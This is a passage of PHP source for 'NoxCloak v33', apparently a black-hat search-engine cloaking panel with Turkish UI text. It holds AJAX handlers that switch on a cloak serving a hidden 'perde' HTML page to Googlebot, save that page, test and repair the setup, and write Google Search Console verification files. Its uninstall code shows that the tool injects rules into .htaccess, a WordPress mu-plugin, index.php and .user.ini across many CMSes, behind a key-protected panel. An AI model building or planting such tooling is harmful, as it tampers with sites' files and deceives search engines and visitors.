        $lock_created = file_exists($rcDir . '/cloak.lock');
        /* Aktif perde başlığını oku */
        $_perde_title = '';
        $_perde_path  = $rcDir . '/perde.html';
        if (file_exists($_perde_path)) {
            $_perde_raw = (string)@file_get_contents($_perde_path);
            if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $_perde_raw, $_ptm))
                $_perde_title = trim(strip_tags($_ptm[1]));
        }
        $_log_detail = $lock_created
            ? 'Googlebot koruması devreye sokuldu.' . ($_perde_title ? ' Perde: ' . $_perde_title : '')
            : 'UYARI: Lock dosyası oluşturulamadı — dizin izinlerini kontrol edin.';
        nc_write_log('Cloak Aktif Edildi', $_log_detail);
        echo json_encode([
            'success' => $lock_created,
            'active'  => $lock_created,
            'paused'  => false,
            'msg'     => $lock_created
                ? 'Cloak aktif edildi.'
                : 'HATA: Lock dosyası yazılamadı — dizin izinlerini kontrol edin.',
        ], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

/* uninstall_cloak — JS tarafı paneli kapatıyor */
if ($action === 'uninstall_cloak') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $rcDir      = nc_content_dir($DIR);
    $htaccess_p = $DIR . '/.htaccess';
    $mu_file    = $DIR . '/wp-content/mu-plugins/nox-engine.php';

    // .htaccess temizle (tüm CMS'ler)
    if (file_exists($htaccess_p)) {
        $ht    = (string)@file_get_contents($htaccess_p);
        $clean = preg_replace('/# BEGIN NOX-CLOAK-RULE.*?# END NOX-CLOAK-RULE\n?/s', '', $ht);
        @file_put_contents($htaccess_p, $clean);
    }
    // WP MU-Plugin kaldır
    if (file_exists($mu_file)) @unlink($mu_file);
    // index.php enjeksiyonunu temizle
    nc_remove_index_inject($DIR);
    // .user.ini'den NoxCloak satırını kaldır
    nc_remove_user_ini($DIR);
    // .nox-{cms} dizinini sil (motor, perde.html, lock, owner_ip hepsi burada)
    if (is_dir($rcDir)) { nc_recursive_rmdir($rcDir); @rmdir($rcDir); }
    if (function_exists('opcache_reset')) @opcache_reset();
    @clearstatcache(true);
    echo json_encode([
        'success' => true,
        'msg'     => 'Sistem tamamen sıfırlandı ve kaldırıldı. Bu PHP dosyasını sunucudan silin.',
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'save_html') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $content    = isset($_POST['content']) ? $_POST['content'] : '';

    /* Boyut limiti: 512 KB — disk doldurma saldırısını önler */
    $max_bytes = 512 * 1024;
    if (strlen($content) > $max_bytes) {
        echo json_encode(['success' => false,
            'msg' => '⛔ Perde içeriği çok büyük (' . round(strlen($content)/1024) . ' KB). Maksimum 512 KB.'],
            JSON_UNESCAPED_UNICODE);
        exit;
    }

    /* Boş içerik */
    if (trim($content) === '') {
        echo json_encode(['success' => false, 'msg' => '⛔ Perde içeriği boş olamaz.'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    /* PHP etiketi kesinlikle yasak */
    if (preg_match('/<\?/i', $content)) {
        echo json_encode(['success' => false, 'msg' => '⛔ Perde içeriğinde PHP etiketi (<?) kullanılamaz.'], JSON_UNESCAPED_UNICODE);
        exit;
    }

    /* Geçerli HTML kontrolü: en az <html veya <!DOCTYPE içermeli */
    if (!preg_match('/<(!DOCTYPE|html)/i', $content)) {
        echo json_encode(['success' => false,
            'msg' => '⛔ Geçersiz içerik. Perde geçerli bir HTML belgesi olmalı (<!DOCTYPE html> veya <html> içermeli).'],
            JSON_UNESCAPED_UNICODE);
        exit;
    }

    $perde_file = nc_content_dir($DIR) . '/perde.html';
    $saved      = @file_put_contents($perde_file, $content);
    if ($saved !== false) {
        /* Sadece boyut ve başlık — önizleme yok */
        $_ptitle = '';
        if (preg_match('/<title[^>]*>(.*?)<\/title>/is', $content, $_ptm))
            $_ptitle = trim(strip_tags($_ptm[1]));
        $_pdetail = $saved . ' bayt' . ($_ptitle ? ' | Başlık: ' . $_ptitle : '');
        nc_write_log('Perde Kaydedildi', $_pdetail);
        echo json_encode(['success' => true,  'msg' => "Perde HTML başarıyla kaydedildi ({$saved} bayt)."], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'msg' => 'Hata: Perde dosyası yazılamadı.'], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if ($action === 'deep_purge') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $total = nc_purge_all_caches($DIR);
    nc_write_log('Cache Temizlendi', "Önbellekler temizlendi ({$total} dosya).");
    echo json_encode(['success' => true, 'msg' => "Önbellekler sıfırlandı ({$total} dosya silindi)."], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'real_bot_test') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    /* Lock dosyasını güvence altına al — paused değilse testi öncesinde onar */
    $rcDir_bt = nc_content_dir($DIR);
    if (!file_exists($rcDir_bt . '/.nox-paused')) {
        nc_smart_fix($DIR);
    }
    $audit = nc_run_internal_audit($DIR);
    /* Sonucu önbelleğe yaz — teşhis tablosu buradan okur */
    $bt_cf = nc_content_dir($DIR) . '/.bottest_cache';
    @file_put_contents($bt_cf, json_encode([
        'time'      => time(),
        'matched'   => $audit['matched'],
        'http_code' => $audit['http_code'],
        'reasons'   => $audit['reasons'],
        'preview'   => $audit['preview'],
    ]));
    nc_write_log('Bot Testi', $audit['matched'] ? 'Başarılı' : 'Başarısız — ' . implode(', ', $audit['reasons']));
    echo json_encode(['success' => true, 'audit' => $audit], JSON_UNESCAPED_UNICODE);
    exit;
}

/* [YENİ] full_diagnosis */
if ($action === 'full_diagnosis') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $diag = nc_full_diagnosis($DIR);
    /* nolog=1 → sayfa yüklemesi (otomatik), log yazma; nolog=0 → kullanıcı butonu, log yaz */
    if (empty($_GET['nolog'])) {
        nc_write_log('Tam Teşhis', "%{$diag['health']} sağlık — {$diag['fixable']} düzeltilebilir sorun.");
    }
    echo json_encode(['success' => true, 'diag' => $diag], JSON_UNESCAPED_UNICODE);
    exit;
}

/* [YENİ] smart_fix */
if ($action === 'smart_fix') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $fixes = nc_smart_fix($DIR);
    $msgs  = array_column($fixes, 1);
    nc_write_log('Akıllı Onarım', implode(' | ', $msgs));
    echo json_encode(['success' => true, 'fixes' => $fixes, 'msg' => implode("\n", $msgs)], JSON_UNESCAPED_UNICODE);
    exit;
}


/* ==================== GSC DOĞRULAMA DOSYASI ==================== */

if ($action === 'save_gsc') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $filename = isset($_POST['filename']) ? trim($_POST['filename']) : '';
    $filecontent = isset($_POST['filecontent']) ? $_POST['filecontent'] : '';

    /* Dosya adı doğrulama: google ile başlamalı, .html ile bitmeli, yalnızca harf+rakam */
    if (!preg_match('/^google[a-z0-9]+\.html$/i', $filename)) {
        echo json_encode(['success' => false,
            'msg' => 'Geçersiz dosya adı. Dosya adı "google" ile başlamalı, ".html" ile bitmeli ve yalnızca harf/rakam içermelidir. Örnek: google085517675749d6fe.html'],
            JSON_UNESCAPED_UNICODE);
        exit;
    }

    /* İçerik doğrulama: google-site-verification: TOKEN veya TOKEN.html */
    $lines = array_filter(array_map('trim', explode("\n", str_replace("\r", '', $filecontent))));
    if (count($lines) !== 1 || !preg_match('/^google-site-verification:\s*[a-zA-Z0-9_-]+(\.html)?$/', reset($lines))) {
        echo json_encode(['success' => false,
            'msg' => 'Geçersiz içerik. Dosya yalnızca şu formatı içermelidir: google-site-verification: TOKEN veya google-site-verification: TOKEN.html'],
            JSON_UNESCAPED_UNICODE);
        exit;
    }

    $dest = $DIR . DIRECTORY_SEPARATOR . $filename;
    $written = @file_put_contents($dest, reset($lines) . "\n");
    if ($written !== false) {
        nc_write_log('GSC Doğrulama', "Dosya kaydedildi: {$filename} ({$written} bayt).");
        echo json_encode(['success' => true, 'msg' => "Dosya başarıyla kaydedildi: {$filename}. Google Search Console'dan doğrulamayı başlatabilirsiniz."], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'msg' => 'Hata: Dosya yazılamadı. Document root dizinine yazma izni kontrol edin.'], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

if ($action === 'get_gsc_status') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $files = @glob($DIR . '/google*.html') ?: [];
    $found = [];
    foreach ($files as $f) {
        $name = basename($f);
        if (preg_match('/^google[a-z0-9]+\.html$/i', $name)) {
            $content = trim((string)@file_get_contents($f));
            $found[] = ['name' => $name, 'content' => $content, 'size' => (int)@filesize($f)];
        }
    }
    echo json_encode(['success' => true, 'files' => $found], JSON_UNESCAPED_UNICODE);
    exit;
}

if ($action === 'delete_gsc') {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json; charset=utf-8');
    $filename = isset($_POST['filename']) ? basename(trim($_POST['filename'])) : '';
    if (!preg_match('/^google[a-z0-9]+\.html$/i', $filename)) {
        echo json_encode(['success' => false, 'msg' => 'Geçersiz dosya adı.'], JSON_UNESCAPED_UNICODE);
        exit;
    }
    $dest = $DIR . DIRECTORY_SEPARATOR . $filename;
    if (file_exists($dest) && @unlink($dest)) {
        nc_write_log('GSC Dosya Silindi', "Silinen: {$filename}");
        echo json_encode(['success' => true, 'msg' => "{$filename} silindi."], JSON_UNESCAPED_UNICODE);
    } else {
        echo json_encode(['success' => false, 'msg' => 'Dosya silinemedi veya bulunamadı.'], JSON_UNESCAPED_UNICODE);
    }
    exit;
}

/* ==================== PANEL GEÇİŞ KAPISI ==================== */

/**
 * nc_panel_gate — Panele açılmadan önce tam otomatik sağlık doğrulaması yapar.
 * 1. nc_smart_fix() çalıştırır (kasıtlı kapalıysa aktivasyon adımları atlanır)
 * 2. Sistem kritik hasarlıysa engeller
 * 3. Kasıtlı kapalıysa geçer (notice ile)
 * 4. cURL yoksa geçer (uyarı ile)
 * 5. Bot testini önbellekli çalıştırır (5 dak TTL)
 * 6. http_code=0 (sunucu kendi kendini engelli) ise geçer
 * 7. Test başarısız → yeniden onarım + yeniden test
 * 8. Hâlâ başarısız → erişimi engeller ve neden yazan ekran gösterir
 */
function nc_panel_gate($DIR) {
    $rcDir  = nc_content_dir($DIR);
    $paused = file_exists($rcDir . '/.nox-paused');

    /* 1 — Her zaman onarım çalıştır (cURL yok — sadece dosya/config kontrolleri) */
    $fixes = nc_smart_fix($DIR);

    /* 2 — Nox dizini yazılabilir değilse kritik uyarı (yine de geçir, panelde göster) */
    if (!is_dir($rcDir) || !is_writable($rcDir)) {
        return [
            'allow'   => true,
            'warning' => basename($rcDir) . ' dizini oluşturulamadı veya yazılamıyor — izinleri kontrol edin.',
            'fixes'   => $fixes,
        ];
    }

    /* 3 — Kasıtlı kapalıysa notice ile geçir */
    if ($paused) {
        return ['allow' => true, 'notice' => 'Cloak kasıtlı olarak kapalı — Googlebot koruması devre dışı.', 'fixes' => $fixes];
    }

    /* Her durumda panele izin ver — bot testi artık sadece GOOGLEBOT TESTİ butonu ile çalışır */
    return ['allow' => true, 'fixes' => $fixes];
}

/**
 * nc_show_gate_block — NOX temalı engelleme ekranını çıkarır ve çıkar.
 */
function nc_show_gate_block($gate, $provided_p) {
    while (ob_get_level() > 0) ob_end_clean();
    $pk     = 'p=' . rawurlencode($provided_p);
    $reason = htmlspecialchars($gate['blocking_reason'] ?? 'Bilinmeyen hata.', ENT_QUOTES, 'UTF-8');
    $detail = htmlspecialchars($gate['blocking_detail'] ?? '', ENT_QUOTES, 'UTF-8');
    $fixes  = $gate['fixes'] ?? [];
    $preview= htmlspecialchars($gate['preview'] ?? '', ENT_QUOTES, 'UTF-8');
    $fix_lines = '';
    foreach ($fixes as $f) {
        $col = $f[0] ? '#3fb950' : '#f85149';
        $ico = $f[0] ? '✓' : '✗';
        $fix_lines .= '<div style="color:' . $col . ';font-size:11px;margin-top:3px;">'
                    . $ico . ' ' . htmlspecialchars($f[1], ENT_QUOTES, 'UTF-8') . '</div>';
    }
    echo '<!DOCTYPE html><html lang="tr"><head><meta charset="utf-8">'
       . '<title>NoxCloak — Güvenlik Kapısı</title>'
       . '<meta name="viewport" content="width=device-width,initial-scale=1">'
       . '<style>'
       . '*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}'
       . 'body{background:#07090e;color:#c9d1d9;font-family:monospace;display:flex;'
       .      'align-items:center;justify-content:center;min-height:100vh;padding:24px;'
       .      'position:relative;overflow:hidden;}'
       . 'body::before{content:"";position:fixed;inset:0;'
       .   'background-image:radial-gradient(circle,#151c27 1px,transparent 1px);'
       .   'background-size:28px 28px;pointer-events:none;}'
       . 'body::after{content:"";position:fixed;inset:0;'
       .   'background:radial-gradient(ellipse 80% 80% at 50% 40%,transparent 25%,rgba(4,5,8,.8) 100%);'
       .   'pointer-events:none;}'
       . '.nox-bg{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;'
       .   'font-size:clamp(5rem,26vw,17rem);font-weight:200;letter-spacing:.35em;'
       .   'color:rgba(21,28,39,.65);pointer-events:none;user-select:none;overflow:hidden;}'
       . '.nox-mark{position:fixed;bottom:18px;right:22px;font-size:9px;letter-spacing:.55em;'
       .   'text-transform:uppercase;color:rgba(184,146,90,.22);font-weight:bold;'
       .   'pointer-events:none;user-select:none;}'
       . '.box{background:rgba(13,18,26,0.94);border:1px solid rgba(184,146,90,.2);'
       .      'border-radius:8px;padding:30px 28px;max-width:580px;width:100%;'
       .      'position:relative;z-index:1;'
       .      'box-shadow:0 0 60px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.03) inset;}'
       . '.box::before{content:"";display:block;height:1px;'
       .   'background:linear-gradient(90deg,transparent,rgba(240,82,82,.5),transparent);'
       .   'margin-bottom:22px;}'
       . '.eyebrow{font-size:9px;letter-spacing:.5em;text-transform:uppercase;'
       .   'color:rgba(184,146,90,.7);margin-bottom:6px;}'
       . 'h2{color:#f85149;font-size:16px;font-weight:bold;margin-bottom:14px;}'
       . '.reason{font-size:13px;color:#c9d1d9;margin-bottom:6px;font-weight:bold;}'
       . '.detail{font-size:11px;color:#8b949e;line-height:1.6;margin-bottom:16px;}'
       . '.section{background:rgba(7,9,14,.6);border:1px solid #1e242d;border-radius:4px;'
       .   'padding:12px;margin-bottom:14px;}'
       . '.section-title{font-size:9px;letter-spacing:.4em;text-transform:uppercase;'
       .   'color:rgba(184,146,90,.55);margin-bottom:8px;}'
       . '.preview{font-size:10px;color:#58a6ff;word-break:break-all;line-height:1.5;'
       .   'max-height:80px;overflow:auto;}'
       . '.btn{background:rgba(184,146,90,.12);color:#b8925a;'
       .   'border:1px solid rgba(184,146,90,.25);padding:8px 18px;border-radius:4px;'
       .   'font-weight:bold;cursor:pointer;font-family:monospace;font-size:11px;'
       .   'letter-spacing:.04em;transition:.15s;text-decoration:none;display:inline-block;'
       .   'margin-top:6px;margin-right:8px;}'
       . '.btn:hover{background:rgba(184,146,90,.22);color:#d4ad70;}'
       . '.tip{font-size:10px;color:#6b7788;margin-top:14px;line-height:1.6;}'
       . '</style></head><body>'
       . '<div class="nox-bg">NOX</div>'
       . '<div class="nox-mark">NOX</div>'
       . '<div class="box">'
       .   '<div class="eyebrow">NoxCloak v33 — Panel Güvenlik Kapısı</div>'
       .   '<h2>⛔ Panel Erişimi Engellendi</h2>'
       .   '<p class="reason">' . $reason . '</p>'
       .   ($detail ? '<p class="detail">' . $detail . '</p>' : '')
       .   '<div class="section">'
       .     '<div class="section-title">Otomatik Onarım Sonuçları</div>'
       .     ($fix_lines ?: '<div style="color:#8b949e;font-size:11px;">Onarım adımı bulunamadı.</div>')
       .   '</div>'
       .   ($preview ? '<div class="section"><div class="section-title">Sunucu Yanıtı (Önizleme)</div>'
       .               '<div class="preview">' . $preview . '</div></div>' : '')
       .   '<div class="tip">'
       .     '⚡ <b>Ne Yapmalıyım?</b> Onarım başarısız mesajlarını inceleyin. '
       .     '.htaccess\'in yazılabilir olduğunu ve mod_rewrite\'ın açık olduğunu doğrulayın. '
       .     'Önbellek eklentisi varsa devre dışı bırakın. Ardından yeniden deneyin.'
       .   '</div>'
       .   '<a href="?' . $pk . '" class="btn">↺ YENİDEN DENE</a>'
       . '</div>'
       . '</body></html>';
    exit;
}

/* ==================== PANEL KURULUMU ==================== */
$cms            = nc_detect_cms($DIR);
$perde_dir      = nc_content_dir($DIR);
$perde_path     = $perde_dir . DIRECTORY_SEPARATOR . 'perde.html';
$perde_content  = file_exists($perde_path) ? (string)@file_get_contents($perde_path) : $default_html;
$pk             = 'p=' . rawurlencode($provided_p);
$lock_file_p    = $perde_dir . '/cloak.lock';
$is_active_init = file_exists($lock_file_p);

$cms_names = [
    'wordpress'=>'WordPress','joomla'=>'Joomla','drupal'=>'Drupal','laravel'=>'Laravel',
    'prestashop'=>'PrestaShop','magento'=>'Magento','opencart'=>'OpenCart',
    'whmcs'=>'WHMCS','symfony'=>'Symfony','codeigniter'=>'CodeIgniter','php'=>'Generic PHP',
];
$cms_label = isset($cms_names[$cms]) ? $cms_names[$cms] : 'PHP';

/* ===== PANEL GEÇİŞ KAPISI — her açılışta çalışır ===== */
$_gate = nc_panel_gate($DIR);
if (!$_gate['allow']) {
    nc_write_log('Panel Engellendi', ($gate_r = $_gate['blocking_reason'] ?? '') . ' | ' . ($_gate['blocking_detail'] ?? ''));
    nc_show_gate_block($_gate, $provided_p);
}
/* Panel açılıyor — gate geçildi */
/* nc_write_log buraya taşınmadı: sayfa yenileme (F5) log kirliliği yaratır.
   Loglar yalnızca kullanıcı aksiyonu (buton/AJAX) ile yazılır. */

/* Gate mesajını panelde göster */
$_gate_notice  = $_gate['notice']  ?? '';
$_gate_warning = $_gate['warning'] ?? '';

/* Bot testi başarısız → kırmızı banner */
$_bot_error_banner = '';
$_bt_cache_path    = nc_content_dir($DIR) . '/.bottest_cache';
if (file_exists($_bt_cache_path)) {
    $_bt_raw = @file_get_contents($_bt_cache_path);
    if ($_bt_raw) {
        $_bt_obj = json_decode($_bt_raw, true);
        if (is_array($_bt_obj) && isset($_bt_obj['matched']) && !$_bt_obj['matched']) {
            $_bt_age_min = round((time() - (int)($_bt_obj['time'] ?? 0)) / 60, 0);
            $_bt_reasons = implode(' ', (array)($_bt_obj['reasons'] ?? []));
            $_bot_error_banner = "Google botları perdeyi göremedi"
                . ($_bt_age_min < 1440 ? " ({$_bt_age_min} dk önce test edildi)" : '')
                . ($_bt_reasons ? ' — ' . $_bt_reasons : '');
        }
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<title>NoxCloak Panel v33</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{
  --bg:#07090e;--surface:#0f1318;--surface2:#141920;
  --border:#1e242d;--border2:#252c38;
  --gold:#b8925a;--gold-dim:rgba(184,146,90,.12);
  --dot:#151c27;
}
*,*::before,*::after{box-sizing:border-box}
body{
  background:var(--bg);color:#c9d1d9;font-family:monospace;
  padding:20px;margin:0;position:relative;min-height:100vh;overflow-x:hidden;
}
/* Noktalı grid arka plan — perde ile aynı mantık, çok hafif */
body::before{
  content:"";position:fixed;inset:0;
  background-image:radial-gradient(circle,var(--dot) 1px,transparent 1px);
  background-size:28px 28px;
  pointer-events:none;z-index:0;
}
/* Vignette — kenarlarda kararır, ortada net kalır */
body::after{
  content:"";position:fixed;inset:0;
  background:radial-gradient(ellipse 85% 80% at 50% 40%,transparent 30%,rgba(4,5,8,.75) 100%);
  pointer-events:none;z-index:0;
}
.wrap{max-width:820px;margin:0 auto;position:relative;z-index:1}
/* Büyük merkez NOX — panel arka planı */
.nox-panel-bg{
  position:fixed;inset:0;
  display:flex;align-items:center;justify-content:center;
  font-size:clamp(5rem,26vw,17rem);font-weight:200;
  letter-spacing:.35em;text-transform:uppercase;text-indent:.35em;
  color:rgba(21,28,39,.65);
  pointer-events:none;user-select:none;
  z-index:0;overflow:hidden;
}
/* Sabit köşe watermark */
.nox-mark{
  position:fixed;bottom:18px;right:22px;
  font-size:9px;letter-spacing:.55em;text-transform:uppercase;
  color:rgba(184,146,90,.22);font-weight:bold;pointer-events:none;z-index:2;
  user-select:none;
}
/* Editör split layout */
.editor-split{display:flex;gap:10px;height:440px}
.editor-pane,.preview-pane{flex:1;display:flex;flex-direction:column;min-width:0;overflow:hidden}
.preview-pane{border:1px solid var(--border2);border-radius:4px;overflow:hidden}
.pane-label{
  font-size:9px;letter-spacing:.4em;text-transform:uppercase;
  color:rgba(184,146,90,.45);padding:5px 8px;
  background:var(--surface2);border-bottom:1px solid var(--border);
  flex-shrink:0;font-weight:bold;
}
.editor-pane .pane-label{
  border:1px solid var(--border);border-bottom:none;border-radius:4px 4px 0 0;
}
#perde-preview{
  flex:1;width:100%;border:none;height:100%;background:#fff;display:block;overflow:auto;
}
#perde-html{flex:1;resize:none;height:100%;border-radius:0 0 4px 4px;border-top:none;overflow:auto;}
@media(max-width:640px){.editor-split{flex-direction:column;height:auto;}
  #perde-html,#perde-preview{height:300px;flex:none;}}
.header{
  border-bottom:1px solid var(--border);padding-bottom:15px;margin-bottom:20px;
  display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;
}
.header h1{font-size:16px;margin:0;color:#e8e4dc;letter-spacing:.04em}
.header h1 span{color:#454d5a;font-weight:normal;font-size:12px}
.card{
  background:var(--surface);border:1px solid var(--border);
  padding:16px;margin-bottom:16px;border-radius:6px;
}
.card h2{font-size:11px;color:#4a5568;margin:0 0 12px 0;text-transform:uppercase;letter-spacing:.6px}
.btn{
  background:var(--surface2);color:#e6edf3;border:1px solid var(--border2);
  padding:8px 14px;cursor:pointer;font-family:monospace;font-size:12px;font-weight:bold;
  border-radius:4px;margin-right:6px;margin-bottom:6px;transition:.12s;display:inline-block;
}
.btn:hover{background:#1e2530;border-color:#3a4455}
.btn:disabled{opacity:.45;cursor:not-allowed}
.btn-green{background:#1a3d2b;color:#3fb950;border-color:#1f4d34}
.btn-green:hover{background:#22503a;color:#4ec862}
.btn-danger{background:#3d1a1a;color:#f85149;border-color:#4d1f1f}
.btn-danger:hover{background:#501f1f;color:#ff6b6b}
.btn-blue{background:#1a2a4a;color:#58a6ff;border-color:#1f3460}
.btn-blue:hover{background:#1f3460}
.btn-amber{background:#3d2e0d;color:#d29922;border-color:#4d3a10}
.btn-amber:hover{background:#503c10}
.path-box{
  background:rgba(7,9,14,.7);border:1px solid var(--border);padding:8px 12px;border-radius:4px;
  font-size:11px;color:#58a6ff;margin-bottom:10px;
  display:flex;justify-content:space-between;align-items:center;
}
.path-box a{color:#58a6ff;text-decoration:none;font-weight:bold}
.path-box a:hover{text-decoration:underline}
textarea{
  width:100%;height:180px;background:rgba(7,9,14,.8);color:#e6edf3;
  border:1px solid var(--border);padding:12px;font-family:monospace;font-size:12px;
  resize:vertical;border-radius:4px;
}
textarea:focus{outline:1px solid rgba(184,146,90,.4);border-color:rgba(184,146,90,.3)}
.msg{
  margin-top:12px;font-size:12px;padding:10px;
  background:rgba(7,9,14,.8);border-left:2px solid var(--gold);
  color:#e6edf3;display:none;border-radius:0 4px 4px 0;line-height:1.6;white-space:pre-wrap;
}
table{width:100%;border-collapse:collapse;font-size:11px;margin-top:5px}
th,td{border:1px solid var(--border);padding:7px 10px;text-align:left}
th{background:var(--surface2);color:#4a5568}
td{color:#c9d1d9}
pre{
  background:rgba(7,9,14,.8);padding:12px;border:1px solid var(--border);
  color:#58a6ff;font-size:11px;max-height:150px;overflow:auto;border-radius:4px;margin:0;
}
.guide-box{font-size:12px;color:#6b7788;line-height:1.6}
.guide-box b{color:#c9d1d9}
.guide-box ul{margin:8px 0 0 20px;padding:0}
.guide-box li{margin-bottom:6px}
.ip-owner{color:#58a6ff;font-weight:bold}
.ip-visitor{color:#d29922;font-weight:bold}
.check-ok{color:#3fb950;font-weight:bold}
.check-fail{color:#f85149;font-weight:bold}
.check-warn{color:#d29922;font-weight:bold}
.health-bar-bg{background:var(--surface2);border-radius:4px;height:8px;width:100%;margin:8px 0 14px}
.health-bar-fill{height:8px;border-radius:4px;transition:width .7s ease}
.fix-report{background:rgba(7,9,14,.7);border:1px solid var(--border);padding:10px;border-radius:4px;margin-bottom:10px}
.fix-report-line{font-size:11px;margin-top:4px}
@keyframes spin{to{transform:rotate(360deg)}}
.spinner{display:inline-block;animation:spin 1s linear infinite}
/* header gold aksan çizgisi */
.header{border-bottom-color:rgba(184,146,90,.18)}
</style>
</head>
<body>
<div class="nox-panel-bg">NOX</div>
<div class="nox-mark">NOX</div>
<div class="wrap">

<?php if ($_gate_notice): ?>
<div style="background:rgba(88,166,255,.07);border:1px solid rgba(88,166,255,.2);border-radius:6px;
            padding:10px 14px;margin-bottom:14px;font-size:11px;color:#58a6ff;position:relative;z-index:1;">
  ℹ️ <?= htmlspecialchars($_gate_notice, ENT_QUOTES, 'UTF-8') ?>
</div>
<?php endif; ?>
<?php if ($_gate_warning): ?>
<div style="background:rgba(210,153,34,.07);border:1px solid rgba(210,153,34,.2);border-radius:6px;
            padding:10px 14px;margin-bottom:14px;font-size:11px;color:#d29922;position:relative;z-index:1;">
  ⚠️ <?= htmlspecialchars($_gate_warning, ENT_QUOTES, 'UTF-8') ?>
</div>
<?php endif; ?>
<?php if ($_bot_error_banner): ?>
<div style="background:rgba(248,81,73,.08);border:1px solid rgba(248,81,73,.35);border-radius:6px;
            padding:12px 16px;margin-bottom:14px;font-size:12px;color:#f85149;position:relative;z-index:1;
            display:flex;align-items:center;gap:10px;">
  <span style="font-size:18px;flex-shrink:0;">🚨</span>
  <span>
    <b>Cloak Başarısız:</b>
    <?= htmlspecialchars($_bot_error_banner, ENT_QUOTES, 'UTF-8') ?>
    <span style="margin-left:8px;">
      <a href="#" onclick="runBotTest();return false;"
         style="color:#f85149;text-decoration:underline;font-weight:bold;">Testi Tekrarla →</a>
    </span>
  </span>
</div>
<?php endif; ?>

  <!-- BAŞLIK -->
  <div class="header">
    <h1>NOXCLOAK <span>[v33 Self-Healing]</span></h1>
    <span style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
      <?= nc_cms_badge($cms) ?>
      <span style="color:#8b949e;font-size:11px;">|</span>
      <code style="background:#1a1f27;color:#e6edf3;padding:2px 8px;border-radius:3px;font-size:11px;border:1px solid #30363d;"><?= htmlspecialchars(nc_get_client_ip(), ENT_QUOTES, 'UTF-8') ?></code>
    </span>
  </div>

  <!-- KONTROL PANELİ -->
  <div class="card">
    <h2>Kontrol Paneli</h2>
    <p style="font-size:12px;margin-bottom:12px;color:#8b949e;">
      Durum: <b id="status-text" style="color:<?= $is_active_init ? '#3fb950' : '#f85149' ?>;">
        <?= $is_active_init ? 'AKTİF (Çalışıyor)' : 'PASİF (Durduruldu)' ?>
      </b>
    </p>
    <div style="display:flex;flex-wrap:wrap;gap:6px;">
      <button id="toggle-btn"
              class="btn <?= $is_active_init ? 'btn-green' : 'btn-danger' ?>"
              onclick="toggleCloak()">CLOAK AÇ / KAPAT</button>
      <button class="btn btn-blue"   onclick="runDeepPurge()">CACHE TEMİZLE</button>
      <button class="btn"            onclick="runRealBotTest()">GOOGLEBOT TESTİ</button>
      <button class="btn btn-blue"   onclick="openRichResultsTest()">ZENGİN SONUÇLAR ↗</button>
    </div>
    <div id="resp-msg" class="msg"></div>
    <div id="test-box" style="display:none;margin-top:12px;">
      <div id="test-res" style="font-size:12px;font-weight:bold;margin-bottom:6px;"></div>
      <pre id="test-pre"></pre>
    </div>
  </div>

  <!-- SİSTEM SAĞLIĞI & ÖNGÖRÜlü TEŞHİS -->
  <div class="card">
    <h2>Sistem Sağlığı &amp; Öngörülü Teşhis</h2>
    <div id="health-container">
      <div style="font-size:12px;color:#8b949e;">
        Teşhis yükleniyor... <span class="spinner">⟳</span>
      </div>
    </div>
    <div style="margin-top:12px;display:flex;flex-wrap:wrap;gap:6px;align-items:center;">
      <button class="btn btn-blue" onclick="loadDiagnosis()" id="diag-refresh-btn">
        TEŞHİSİ YENİLE
      </button>
      <button id="smart-fix-btn" class="btn btn-green" onclick="runSmartFix()" style="display:none;">
        ⚡ AKILLI TAM ONAR
      </button>
      <span id="diag-status" style="font-size:11px;color:#58a6ff;"></span>
    </div>
  </div>

  <!-- PERDE HTML EDİTÖRÜ -->
  <div class="card">
    <h2>Perde HTML İçeriği (NOX Shell Tasarımı)</h2>
    <div class="path-box">
      <span>🗂 <b><?= htmlspecialchars($perde_path, ENT_QUOTES, 'UTF-8') ?></b></span>
      <a href="?<?= $pk ?>&a=view_perde" target="_blank">Tam Ekran ↗</a>
    </div>
    <?php
    $engine_path = nc_cloak_engine_path($DIR, $cms);
    $engine_exists = file_exists($engine_path);
    ?>
    <div class="path-box" style="margin-bottom:0;">
      <span>⚙ Motor: <b style="color:<?= $engine_exists ? '#3fb950' : '#f85149' ?>;"><?= htmlspecialchars($engine_path, ENT_QUOTES, 'UTF-8') ?></b>
        <?= $engine_exists ? '<span style="color:#3fb950;font-size:10px;margin-left:6px;">● AKTİF</span>' : '<span style="color:#f85149;font-size:10px;margin-left:6px;">● YOK</span>' ?>
      </span>
    </div>

    <div class="editor-split" id="editor-split">
      <!-- Sol: Editör -->
      <div class="editor-pane">
        <div class="pane-label">EDITÖR</div>
        <textarea id="perde-html"><?= htmlspecialchars($perde_content, ENT_QUOTES, 'UTF-8') ?></textarea>
      </div>
      <!-- Sağ: Canlı önizleme -->
      <div class="preview-pane" id="preview-pane">
        <div class="pane-label">
          CANLI ÖNİZLEME
